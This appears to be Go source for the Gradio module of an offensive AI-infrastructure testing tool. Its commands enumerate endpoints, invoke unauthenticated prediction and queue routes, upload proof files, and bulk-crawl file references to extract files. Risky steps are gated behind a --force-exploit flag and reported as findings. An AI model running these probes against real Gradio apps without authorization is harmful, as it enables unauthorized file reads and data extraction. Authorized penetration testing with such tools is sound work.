package main

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/spf13/cobra"

	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/gradio"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	gradioTarget         string
	gradioHeaders        []string
	gradioAPIName        string
	gradioFnIndex        int
	gradioInputJSON      string
	gradioFile           string
	gradioUploadFilename string
	gradioUploadContent  string

	// D3: bulk file extraction
	gradioBulk     bool
	gradioMaxFiles int
	gradioMaxBytes int64
)
var gradioHandlePattern = regexp.MustCompile(`(?i)(event_id|hash|queue_id|session_hash)"?\s*[:=]\s*"?(?P<value>[A-Za-z0-9._:-]+)`)

var gradioClientFactory = newGradioClient

var gradioCmd = &cobra.Command{
	Use:   "gradio",
	Short: "Enumerate and probe Gradio apps",
	Long: `Enumerate Gradio app config and endpoint metadata, call a bounded prediction surface,
download exposed file references, or run bounded queue/upload proofs against file-capable routes.

Queue and upload proofs require --force-exploit.`,
	Example: strings.Join([]string{
		formatCommandExample("gradio --target http://127.0.0.1:7860 enum"),
		formatCommandExample("gradio --target http://127.0.0.1:7860 predict --api-name predict --input-json '[\"hello\"]'"),
		formatCommandExample("gradio --target http://127.0.0.1:7860 file-chain --file /tmp/gradio/demo.txt"),
		formatCommandExample("gradio --target http://127.0.0.1:7860 queue-probe --api-name predict --input-json '[\"hello\"]' --force-exploit"),
		formatCommandExample("gradio --target http://127.0.0.1:7860 upload-file --force-exploit"),
		formatCommandExample("gradio --target http://127.0.0.1:7860 download-file --file /tmp/gradio/demo.txt"),
		formatCommandExample("gradio --target http://127.0.0.1:7860 serve-probe --file /tmp/gradio/demo.txt --force-exploit"),
	}, "\n"),
}

var gradioEnumCmd = &cobra.Command{
	Use:   "enum",
	Short: "Enumerate Gradio config and endpoints",
	Long: `Discover a Gradio app's configuration: version, title, endpoints, and
capabilities.

The config document is the whole map of the app — every callable API route and
the component types behind it. Component types are what matter offensively: a
File component implies file read/serve paths, and a Textbox wired to a model
implies an inference surface worth injecting into.

This is a read-only probing operation.`,
	Example: formatCommandExample("gradio --target http://127.0.0.1:7860 enum"),
	RunE:    runGradioEnum,
}

var gradioPredictCmd = &cobra.Command{
	Use:   "predict",
	Short: "Call a bounded Gradio prediction surface",
	Long: `Call a bounded Gradio prediction endpoint.

Invokes a discovered API route with operator-supplied input and captures the
response. This is how a Gradio-fronted model is actually exercised — the route
either accepts the call (proving an unauthenticated inference surface) or
rejects it, and either way the response is recorded as evidence.

Bounded and read-only with respect to the target's data; it calls only the route
you name.`,
	Example: formatCommandExample("gradio --target http://127.0.0.1:7860 predict --api-name predict --input-json '[\"hello\"]'"),
	RunE:    runGradioPredict,
}

var gradioQueueProbeCmd = &cobra.Command{
	Use:         "queue-probe",
	Annotations: map[string]string{"aipostex.gated": "true"},
	Short:       "Run a bounded queue-backed execution probe",
	Long: `Run a bounded execution probe against the queue-backed prediction path.

Modern Gradio apps run predictions through an event queue rather than a direct
call, so an app can look unreachable on the direct path while remaining fully
callable through the queue. This probes that path explicitly and reports whether
queued execution actually completes.

This drives execution against the target, so it requires --force-exploit.`,
	Example: formatCommandExample("gradio --target http://127.0.0.1:7860 queue-probe --api-name predict --input-json '[\"hello\"]' --force-exploit"),
	RunE:    runGradioQueueProbe,
}

var gradioUploadFileCmd = &cobra.Command{
	Use:         "upload-file",
	Annotations: map[string]string{"aipostex.gated": "true"},
	Short:       "Probe the global Gradio /upload surface with a tiny operator-marked file",
	Long: `Upload a tiny operator-marked file through the global Gradio /upload endpoint.
This tests whether the global upload surface is reachable, not a specific API route.
The --api-name and --fn-index selectors are not applicable here.

This drives execution against the target, so it requires --force-exploit.`,
	Example: formatCommandExample("gradio --target http://127.0.0.1:7860 upload-file --force-exploit"),
	RunE:    runGradioUploadFile,
}

var gradioDownloadFileCmd = &cobra.Command{
	Use:   "download-file",
	Short: "Download a bounded file reference",
	Long: `Download a bounded file by its Gradio file reference.

Gradio serves files through reference paths handed out by the app. If those
references are guessable or leak in a response, the file route becomes a read
primitive — this verb resolves one and captures the bytes as evidence.`,
	Example: formatCommandExample("gradio --target http://127.0.0.1:7860 download-file --file /tmp/gradio/demo.txt"),
	RunE:    runGradioDownloadFile,
}

var gradioFileChainCmd = &cobra.Command{
	Use:   "file-chain",
	Short: "Drive a discovered Gradio file handle through a bounded read chain",
	Long: `Drive a discovered file handle through the bounded read chain, correlating file
paths across Gradio's serving routes.

A single file reference can be reachable through several routes (direct file,
component-scoped, or re-served). Walking the chain shows which of those actually
return content, turning a leaked handle into a demonstrated read.`,
	Example: formatCommandExample("gradio --target http://127.0.0.1:7860 file-chain --file /tmp/gradio/demo.txt"),
	RunE:    runGradioFileChain,
}

var gradioServeProbeCmd = &cobra.Command{
	Use:         "serve-probe",
	Annotations: map[string]string{"aipostex.gated": "true"},
	Short:       "Validate bounded re-serve or alternate file-read paths for a Gradio handle",
	Long: `Validate bounded re-serve and alternate file-read paths for a Gradio file
handle.

Answers whether a file the app served once can be served again — or reached by a
different route than the one that produced it. That distinguishes an incidental
one-shot reference from a durable read surface.

This drives execution against the target, so it requires --force-exploit.`,
	Example: formatCommandExample("gradio --target http://127.0.0.1:7860 serve-probe --file /tmp/gradio/demo.txt --force-exploit"),
	RunE:    runGradioServeProbe,
}

func init() {
	gradioCmd.PersistentFlags().StringVarP(&gradioTarget, "target", "t", "", "Gradio app URL (required)")
	gradioCmd.PersistentFlags().StringSliceVar(&gradioHeaders, "header", nil, "Additional HTTP header(s) in 'Key: Value' format")

	gradioPredictCmd.Flags().StringVar(&gradioAPIName, "api-name", "", "Named API route to call")
	gradioPredictCmd.Flags().IntVar(&gradioFnIndex, "fn-index", -1, "Function index to call when no api-name is available")
	gradioPredictCmd.Flags().StringVar(&gradioInputJSON, "input-json", "", "JSON payload for the bounded prediction call")

	gradioQueueProbeCmd.Flags().StringVar(&gradioAPIName, "api-name", "", "Named API route to probe")
	gradioQueueProbeCmd.Flags().IntVar(&gradioFnIndex, "fn-index", -1, "Function index to probe when no api-name is available")
	gradioQueueProbeCmd.Flags().StringVar(&gradioInputJSON, "input-json", "", "JSON payload for the bounded queue probe")

	gradioUploadFileCmd.Flags().StringVar(&gradioUploadFilename, "filename", "aipostex-proof.txt", "Name for the tiny upload proof file")
	gradioUploadFileCmd.Flags().StringVar(&gradioUploadContent, "content", "aipostex-upload-proof", "Content for the tiny upload proof file")

	gradioDownloadFileCmd.Flags().StringVar(&gradioFile, "file", "", "File path or file reference to retrieve")
	gradioFileChainCmd.Flags().StringVar(&gradioFile, "file", "", "File path or file reference to drive through the chain")
	gradioFileChainCmd.Flags().BoolVar(&gradioBulk, "bulk", false, "BFS-crawl nested file references and extract all reachable files")
	gradioFileChainCmd.Flags().IntVar(&gradioMaxFiles, "max-files", 100, "Maximum files to extract in bulk mode")
	gradioFileChainCmd.Flags().Int64Var(&gradioMaxBytes, "max-bytes", 10*1024*1024, "Maximum total bytes to extract in bulk mode")
	gradioServeProbeCmd.Flags().StringVar(&gradioFile, "file", "", "File path or file reference to validate through alternate serve paths")

	gradioCmd.AddCommand(gradioEnumCmd, gradioPredictCmd, gradioQueueProbeCmd, gradioUploadFileCmd, gradioDownloadFileCmd, gradioFileChainCmd, gradioServeProbeCmd)
}

func runGradioEnum(cmd *cobra.Command, args []string) error {
	client, headers, err := gradioClientFactory()
	if err != nil {
		return err
	}
	cfgResult, err := client.Config()
	if err != nil {
		return fmt.Errorf("enumerating gradio app: %w", err)
	}
	findings := []report.Finding{
		newExploitFinding(
			report.SourceGradio,
			gradioTarget,
			"Gradio app enumerated",
			report.SeverityInfo,
			fmt.Sprintf("Enumerated Gradio app %s with %d endpoint(s)", safeLabel(cfgResult.Title), len(cfgResult.Endpoints)),
			map[string]interface{}{
				"module":         "gradio",
				"action":         "enum",
				"mutating":       false,
				"provider":       "gradio",
				"headers":        headerNames(headers),
				"title":          cfgResult.Title,
				"version":        cfgResult.Version,
				"endpoint_count": len(cfgResult.Endpoints),
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "recon", "reachable", "gradio-enum", "config")
	apiNames := make([]string, 0, len(cfgResult.Endpoints))
	fnIndexes := make([]int, 0, len(cfgResult.Endpoints))
	for _, endpoint := range cfgResult.Endpoints {
		if strings.TrimSpace(endpoint.APIName) != "" {
			apiNames = append(apiNames, endpoint.APIName)
		}
		if endpoint.FnIndex >= 0 {
			fnIndexes = append(fnIndexes, endpoint.FnIndex)
		}
	}
	summaryPlan := buildGradioEnumWorkflowPlan(gradioTarget, apiNames, fnIndexes)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, summaryPlan)
	if len(cfgResult.Endpoints) > 0 {
		finding := newExploitFinding(
			report.SourceGradio,
			gradioTarget,
			"Gradio callable API surface exposed",
			report.SeverityHigh,
			"Gradio config exposed callable endpoint metadata without authentication.",
			map[string]interface{}{
				"module":   "gradio",
				"action":   "enum",
				"mutating": false,
				"provider": "gradio",
				"endpoint": "/config",
			},
		)
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, summaryPlan)
		var epLines []string
		for _, ep := range cfgResult.Endpoints {
			epLines = append(epLines, fmt.Sprintf("%s: fn_index=%d queue=%t file_input=%t file_output=%t preferred_path=%s",
				safeLabel(ep.APIName), ep.FnIndex, ep.Queue, ep.FileInput, ep.FileOutput, ep.PreferredPath))
		}
		finding.Evidence = strings.Join(epLines, "\n")
		findings = append(findings, finding)
	}
	for _, endpoint := range cfgResult.Endpoints {
		finding := newExploitFinding(
			report.SourceGradio,
			gradioTarget,
			fmt.Sprintf("Gradio endpoint discovered: %s", safeLabel(endpoint.APIName)),
			report.SeverityInfo,
			fmt.Sprintf("Gradio endpoint %s is exposed with fn_index %d", safeLabel(endpoint.APIName), endpoint.FnIndex),
			map[string]interface{}{
				"module":            "gradio",
				"action":            "enum",
				"mutating":          false,
				"provider":          "gradio",
				"endpoint":          endpoint.APIName,
				"fn_index":          endpoint.FnIndex,
				"queue_enabled":     endpoint.Queue,
				"file_input":        endpoint.FileInput,
				"file_output":       endpoint.FileOutput,
				"preferred_path":    endpoint.PreferredPath,
				"risk_label":        gradioEndpointRiskLabel(endpoint.Queue, endpoint.FileInput, endpoint.FileOutput),
				"capability_labels": summarizeCapabilityLabels(gradioEndpointLabels(endpoint)...),
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "gradio-enum", gradioEndpointLabels(endpoint)...)
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildGradioEndpointWorkflowPlan(gradioTarget, endpoint.APIName, endpoint.FnIndex))
		findings = append(findings, finding)
	}
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "gradio",
		Action:              "enum",
		ResourcesEnumerated: len(cfgResult.Endpoints),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{summaryPlan},
	})
}

func runGradioPredict(cmd *cobra.Command, args []string) error {
	if err := validateGradioSelector("predict"); err != nil {
		return err
	}
	if strings.TrimSpace(gradioInputJSON) == "" {
		return missingFlagError("input-json", formatCommandExample("gradio --target http://127.0.0.1:7860 predict --api-name predict --input-json '[\"hello\"]'"))
	}
	client, _, err := gradioClientFactory()
	if err != nil {
		return err
	}
	var fnIndex *int
	if gradioFnIndex >= 0 {
		fnIndex = &gradioFnIndex
	}
	response, err := client.Predict(gradioAPIName, fnIndex, gradioInputJSON)
	if err != nil {
		return fmt.Errorf("calling gradio predict surface: %w", err)
	}
	fileRefs := extractFileReferences(response)
	handles := extractGradioHandles(response)
	// A 200 transport does not mean the prediction ran: Gradio returns an event body
	// that can carry success:false / unexpected_error / 404. Classify each run on its
	// own body, not on transport success.
	callable := !gradioResponseIndicatesFailure(response)
	severity := report.SeverityInfo
	stage, landed := "recon", "reachable"
	title := "Gradio prediction surface rejected the call"
	desc := "Gradio returned a failed/error response to the bounded prediction call; the surface is reachable but the call did not run."
	partialFailures := 1
	if callable {
		severity = report.SeverityHigh
		stage, landed = "impact", "influenced"
		title = "Gradio prediction surface callable"
		desc = "Gradio accepted a bounded prediction call and returned response content."
		partialFailures = 0
	}
	finding := newExploitFinding(
		report.SourceGradio,
		gradioTarget,
		title,
		severity,
		desc,
		map[string]interface{}{
			"module":             "gradio",
			"action":             "predict",
			"mutating":           false,
			"provider":           "gradio",
			"endpoint":           gradioAPIName,
			"fn_index":           gradioFnIndex,
			"returned_file_refs": strings.Join(fileRefs, ","),
			"returned_handles":   strings.Join(handles, ","),
		},
	)
	finding.Evidence = response
	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "gradio-predict", "predict")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildGradioPredictWorkflowPlan(gradioTarget, fileRefs, gradioAPIName, gradioFnIndex))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "gradio",
		Action:              "predict",
		ResourcesEnumerated: 1,
		PartialFailures:     partialFailures,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{buildGradioPredictWorkflowPlan(gradioTarget, fileRefs, gradioAPIName, gradioFnIndex)},
	})
}

// gradioResponseIndicatesFailure reports whether a Gradio predict/queue event body
// signals a failed call (Gradio returns HTTP 200 with an error envelope), so a failed
// prediction is not reported as a successful/callable surface.
func gradioResponseIndicatesFailure(body string) bool {
	lower := strings.ToLower(body)
	for _, marker := range []string{`"success": false`, `"success":false`, "unexpected_error", "session_not_found", "404: not found", `"error"`} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func runGradioQueueProbe(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("gradio queue-probe"); err != nil {
		return err
	}
	if err := validateGradioSelector("queue-probe"); err != nil {
		return err
	}
	if strings.TrimSpace(gradioInputJSON) == "" {
		return missingFlagError("input-json", formatCommandExample("gradio --target http://127.0.0.1:7860 queue-probe --api-name predict --input-json '[\"hello\"]' --force-exploit"))
	}
	client, _, err := gradioClientFactory()
	if err != nil {
		return err
	}
	var fnIndex *int
	if gradioFnIndex >= 0 {
		fnIndex = &gradioFnIndex
	}
	result, err := client.QueueProbe(gradioAPIName, fnIndex, gradioInputJSON)
	if err != nil {
		return fmt.Errorf("running gradio queue probe: %w", err)
	}
	handles := extractGradioHandles(result.Response)

	severity := report.SeverityMedium
	proofCategory := "discovery"
	landed := "reachable"
	title := "Gradio queue status metadata exposed"
	description := "Gradio queue status endpoint responded but the queue job was not accepted. Queue metadata is readable, but job submission was not confirmed."
	mutating := false
	if result.JoinAccepted {
		severity = report.SeverityHigh
		proofCategory = "takeover"
		landed = "influenced"
		title = "Gradio queue job accepted"
		description = "Gradio accepted a bounded queue probe and returned queue execution handles."
		mutating = true
	}

	finding := newExploitFinding(
		report.SourceGradio,
		gradioTarget,
		title,
		severity,
		description,
		map[string]interface{}{
			"module":           "gradio",
			"action":           "queue-probe",
			"mutating":         mutating,
			"provider":         "gradio",
			"endpoint":         gradioAPIName,
			"fn_index":         gradioFnIndex,
			"join_accepted":    result.JoinAccepted,
			"returned_handles": strings.Join(handles, ","),
		},
	)
	finding.Evidence = result.Response
	finding.Metadata = applyStageLanded(finding.Metadata, proofCategory, landed, "gradio-queue-probe", "queue")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildGradioQueueWorkflowPlan(gradioTarget, gradioAPIName, gradioFnIndex))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "gradio",
		Action:              "queue-probe",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            mutating,
		WorkflowPlans:       []workflowPlan{buildGradioQueueWorkflowPlan(gradioTarget, gradioAPIName, gradioFnIndex)},
	})
}

func runGradioUploadFile(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("gradio upload-file"); err != nil {
		return err
	}
	client, _, err := gradioClientFactory()
	if err != nil {
		return err
	}
	response, err := client.UploadFile(gradioUploadFilename, gradioUploadContent)
	if err != nil {
		return fmt.Errorf("uploading gradio proof file: %w", err)
	}
	fileRefs := extractFileReferences(response)
	handles := extractGradioHandles(response)
	finding := newExploitFinding(
		report.SourceGradio,
		gradioTarget,
		"Gradio global upload surface accepted bounded file proof",
		report.SeverityHigh,
		"Gradio accepted a tiny operator-marked file upload via the global /upload endpoint. This surface is not per-endpoint; any upload-capable route may consume the resulting reference.",
		map[string]interface{}{
			"module":             "gradio",
			"action":             "upload-file",
			"mutating":           true,
			"provider":           "gradio",
			"endpoint":           "global-upload",
			"uploaded_filename":  gradioUploadFilename,
			"returned_file_refs": strings.Join(fileRefs, ","),
			"returned_handles":   strings.Join(handles, ","),
		},
	)
	finding.Evidence = response
	// An accepted upload is a landed write (impact/influenced); reserve `own` for
	// execution/takeover.
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "gradio-upload-file", "upload")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildGradioPredictWorkflowPlan(gradioTarget, fileRefs, gradioAPIName, gradioFnIndex))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "gradio",
		Action:              "upload-file",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{buildGradioPredictWorkflowPlan(gradioTarget, fileRefs, gradioAPIName, gradioFnIndex)},
	})
}

func runGradioDownloadFile(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(gradioFile) == "" {
		return missingFlagError("file", formatCommandExample("gradio --target http://127.0.0.1:7860 download-file --file /tmp/gradio/demo.txt"))
	}
	client, _, err := gradioClientFactory()
	if err != nil {
		return err
	}
	body, truncated, err := client.DownloadFile(gradioFile, 256*1024)
	if err != nil {
		return fmt.Errorf("downloading gradio file: %w", err)
	}
	finding := newExploitFinding(
		report.SourceGradio,
		gradioTarget,
		fmt.Sprintf("Gradio file readable: %s", gradioFile),
		report.SeverityHigh,
		fmt.Sprintf("Gradio returned readable file material for %s", gradioFile),
		map[string]interface{}{
			"module":            "gradio",
			"action":            "download-file",
			"mutating":          false,
			"provider":          "gradio",
			"path":              gradioFile,
			"artifact_kind":     artifactKind(gradioFile, body),
			"sensitivity_hints": strings.Join(sensitivityHints(gradioFile, body), ","),
		},
	)
	finding.Evidence = body
	if truncated {
		finding.Metadata["evidence_truncated"] = true
		finding.Metadata["evidence_limit_bytes"] = int64(256 * 1024)
	}
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "read-confirmed", "gradio-download-file", "file-read")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildGradioDownloadFileSummaryWorkflowPlan(gradioTarget, gradioFile))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "gradio",
		Action:              "download-file",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{buildGradioDownloadFileSummaryWorkflowPlan(gradioTarget, gradioFile)},
	})
}

func runGradioFileChain(cmd *cobra.Command, args []string) error {
	if strings.TrimSpace(gradioFile) == "" {
		return missingFlagError("file", formatCommandExample("gradio --target http://127.0.0.1:7860 file-chain --file /tmp/gradio/demo.txt"))
	}
	client, _, err := gradioClientFactory()
	if err != nil {
		return err
	}

	if gradioBulk {
		return runGradioFileChainBulk(client)
	}

	body, truncated, err := client.DownloadFile(gradioFile, 256*1024)
	if err != nil {
		return fmt.Errorf("running gradio file chain: %w", err)
	}
	fileRefs := extractFileReferences(body)
	description := fmt.Sprintf("Validated bounded file chain for %s and discovered %d nested file reference(s)", gradioFile, len(fileRefs))
	finding := newExploitFinding(
		report.SourceGradio,
		gradioTarget,
		fmt.Sprintf("Gradio file chain confirmed: %s", gradioFile),
		report.SeverityHigh,
		description,
		map[string]interface{}{
			"module":             "gradio",
			"action":             "file-chain",
			"mutating":           false,
			"provider":           "gradio",
			"path":               gradioFile,
			"returned_file_refs": strings.Join(fileRefs, ","),
			"artifact_kind":      artifactKind(gradioFile, body),
		},
	)
	finding.Evidence = body
	if truncated {
		finding.Metadata["evidence_truncated"] = true
		finding.Metadata["evidence_limit_bytes"] = int64(256 * 1024)
	}
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", classifyGradioServeChain(true, gradioFile, body), "gradio-file-chain", "file-chain")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildGradioFileChainWorkflowPlan(gradioTarget, gradioFile))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "gradio",
		Action:              "file-chain",
		ResourcesEnumerated: 1 + len(fileRefs),
		PartialFailures:     0,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{buildGradioFileChainWorkflowPlan(gradioTarget, gradioFile)},
	})
}

func runGradioFileChainBulk(client *gradio.Client) error {
	maxFiles := gradioMaxFiles
	if maxFiles <= 0 {
		maxFiles = 100
	}
	maxBytes := gradioMaxBytes
	if maxBytes <= 0 {
		maxBytes = 10 * 1024 * 1024
	}

	type fileResult struct {
		path string
		body string
		refs []string
	}

	visited := make(map[string]bool)
	queue := []string{gradioFile}
	var results []fileResult
	var totalBytes int64
	var failures int

	for len(queue) > 0 && len(results) < maxFiles && totalBytes < maxBytes {
		path := queue[0]
		queue = queue[1:]
		if visited[path] {
			continue
		}
		visited[path] = true

		remaining := maxBytes - totalBytes
		if remaining <= 0 {
			break
		}
		limit := int64(256 * 1024)
		if remaining < limit {
			limit = remaining
		}

		body, _, err := client.DownloadFile(path, limit)
		if err != nil {
			failures++
			infof("[bulk] failed to download %s: %v", path, err)
			continue
		}
		totalBytes += int64(len(body))
		refs := extractFileReferences(body)
		results = append(results, fileResult{path: path, body: body, refs: refs})
		infof("[bulk] extracted %s (%d bytes, %d refs)", path, len(body), len(refs))

		for _, ref := range refs {
			if !visited[ref] {
				queue = append(queue, ref)
			}
		}
	}

	var findings []report.Finding
	for _, r := range results {
		finding := newExploitFinding(
			report.SourceGradio,
			gradioTarget,
			fmt.Sprintf("Gradio bulk extracted: %s", r.path),
			report.SeverityHigh,
			fmt.Sprintf("Bulk extracted %s (%d bytes, %d nested refs)", r.path, len(r.body), len(r.refs)),
			map[string]interface{}{
				"module":             "gradio",
				"action":             "file-chain",
				"mutating":           false,
				"provider":           "gradio",
				"path":               r.path,
				"returned_file_refs": strings.Join(r.refs, ","),
				"artifact_kind":      artifactKind(r.path, r.body),
				"bulk":               true,
			},
		)
		finding.Evidence = r.body
		finding.Metadata = applyStageLanded(finding.Metadata, "impact", classifyGradioServeChain(true, r.path, r.body), "gradio-file-chain", "bulk")
		findings = append(findings, finding)
	}

	// Summary finding
	var extractedPaths []string
	for _, r := range results {
		extractedPaths = append(extractedPaths, r.path)
	}
	summary := newExploitFinding(
		report.SourceGradio,
		gradioTarget,
		fmt.Sprintf("Gradio bulk extraction summary: %d file(s)", len(results)),
		report.SeverityHigh,
		fmt.Sprintf("Bulk BFS extraction from seed %s yielded %d file(s), %d bytes total, %d failure(s)",
			gradioFile, len(results), totalBytes, failures),
		map[string]interface{}{
			"module":      "gradio",
			"action":      "file-chain",
			"mutating":    false,
			"provider":    "gradio",
			"seed":        gradioFile,
			"files_found": len(results),
			"total_bytes": totalBytes,
			"failures":    failures,
			"bulk":        true,
		},
	)
	summary.Evidence = strings.Join(extractedPaths, "\n")
	// The bulk summary is a READ of the child files — its landed is the strongest child result
	// (a real file read = read-confirmed), never the invalid "exploited"/execution-confirmed.
	bulkStage, bulkLanded := "recon", "reachable"
	if len(results) > 0 {
		bulkStage, bulkLanded = "impact", "read-confirmed"
	}
	summary.Metadata = applyStageLanded(summary.Metadata, bulkStage, bulkLanded, "gradio-file-chain", "bulk-summary")
	findings = append(findings, summary)

	infof("Bulk extraction complete: %d file(s), %d bytes", len(results), totalBytes)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "gradio",
		Action:              "file-chain",
		ResourcesEnumerated: len(results),
		PartialFailures:     failures,
		Mutating:            false,
	})
}

func runGradioServeProbe(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("gradio serve-probe"); err != nil {
		return err
	}
	if strings.TrimSpace(gradioFile) == "" {
		return missingFlagError("file", formatCommandExample("gradio --target http://127.0.0.1:7860 serve-probe --file /tmp/gradio/demo.txt --force-exploit"))
	}
	client, _, err := gradioClientFactory()
	if err != nil {
		return err
	}
	body, truncated, err := client.ServeProbe(gradioFile, 128*1024)
	if err != nil {
		return fmt.Errorf("running gradio serve probe: %w", err)
	}
	finding := newExploitFinding(
		report.SourceGradio,
		gradioTarget,
		fmt.Sprintf("Gradio serve/read chain confirmed: %s", gradioFile),
		report.SeverityHigh,
		fmt.Sprintf("A bounded alternate file/serve path returned content for %s", gradioFile),
		map[string]interface{}{
			"module":        "gradio",
			"action":        "serve-probe",
			"mutating":      true,
			"provider":      "gradio",
			"path":          gradioFile,
			"artifact_kind": artifactKind(gradioFile, body),
		},
	)
	finding.Evidence = body
	if truncated {
		finding.Metadata["evidence_truncated"] = true
		finding.Metadata["evidence_limit_bytes"] = 128 * 1024
	}
	// A read/serve chain is a confirmed impact (read-confirmed), not takeover — reserve
	// `own` for execution/persistence.
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", classifyGradioServeChain(true, gradioFile, body), "gradio-serve-probe", "serve-probe")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildGradioServeWorkflowPlan(gradioTarget, gradioFile))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "gradio",
		Action:              "serve-probe",
		ResourcesEnumerated: 1,
		PartialFailures:     0,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{buildGradioServeWorkflowPlan(gradioTarget, gradioFile)},
	})
}

func newGradioClient() (*gradio.Client, http.Header, error) {
	if strings.TrimSpace(gradioTarget) == "" {
		return nil, nil, missingFlagError("target", formatCommandExample("gradio --target http://127.0.0.1:7860 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(gradioHeaders)
	if err != nil {
		return nil, nil, err
	}
	target := normalizeAndWarnTarget(gradioTarget)
	gradioTarget = target
	client, err := gradio.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, nil, err
	}
	client.HTTPClient = httpClient
	return client, headers, nil
}

func validateGradioSelector(action string) error {
	if (strings.TrimSpace(gradioAPIName) == "" && gradioFnIndex < 0) || (strings.TrimSpace(gradioAPIName) != "" && gradioFnIndex >= 0) {
		return fmt.Errorf("provide exactly one of --api-name or --fn-index\nexample: %s", formatCommandExample("gradio --target http://127.0.0.1:7860 "+action+" --api-name predict --input-json '[\"hello\"]'"))
	}
	return nil
}

func gradioEndpointLabels(endpoint gradio.Endpoint) []string {
	labels := make([]string, 0, 5)
	if endpoint.Queue {
		labels = append(labels, "queue")
	}
	if endpoint.FileInput {
		labels = append(labels, "file-input")
	}
	if endpoint.FileOutput {
		labels = append(labels, "file-output")
	}
	if endpoint.PreferredPath != "" {
		labels = append(labels, "predict-path")
	}
	return uniqueSortedStrings(labels)
}

func extractGradioHandles(raw string) []string {
	matches := gradioHandlePattern.FindAllStringSubmatch(raw, -1)
	out := make([]string, 0, len(matches))
	for _, match := range matches {
		if len(match) < 3 {
			continue
		}
		out = append(out, match[2])
	}
	return uniqueSortedStrings(out)
}
